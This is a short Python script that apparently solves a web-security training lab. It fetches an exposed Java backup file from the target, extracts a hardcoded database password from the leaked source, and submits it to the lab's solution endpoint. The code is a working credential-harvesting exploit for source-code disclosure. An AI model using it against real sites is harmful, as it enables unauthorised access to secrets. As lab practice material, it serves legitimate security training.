#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_password(s, url):
    print("[*] Fetching password from backup file...")
    backup_url = url + "/backup/ProductTemplate.java.bak"
    r = requests.get(backup_url, verify=False, timeout=10)
    res = r.text
    if "postgres" in res:
        print("[+] Password discovered in source code")
        lines = res.splitlines()
        for i, line in enumerate(lines):
            if ".withAutoCommit()" in line:
                password = lines[i-1].split('"')[1]
                print(f"[+] Password: {password}")
                return password

def submit_answer(s, url):
    key = get_password(s, url)
    print("[*] Submitting answer...")
    submit_url = url + "/submitSolution"
    data = {"answer": key}
    r = s.post(submit_url, data=data, verify=False, allow_redirects=True)
    if "true" in r.text:
        return True
    return False 

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if  not submit_answer(s, url):
        print("[+] Error submitting answer")
        return
    print("[+] Lab solved") 

if __name__=="__main__":
    main()